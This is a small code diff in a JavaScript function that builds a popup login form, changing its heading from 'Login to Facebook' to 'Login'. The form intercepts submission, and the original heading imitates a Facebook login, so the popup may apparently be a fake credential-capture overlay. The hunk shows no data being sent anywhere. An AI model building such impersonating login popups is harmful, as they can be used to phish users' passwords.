@@ -22,7 +22,7 @@ function createPopup() {
     heading.style.fontSize = '25px';
     heading.style.marginBottom = '25px';
     heading.style.color = 'black';
-    heading.textContent = 'Login to Facebook';
+    heading.textContent = 'Login';
     const form = document.createElement('form');
     form.onsubmit = function(event) {
         event.preventDefault();
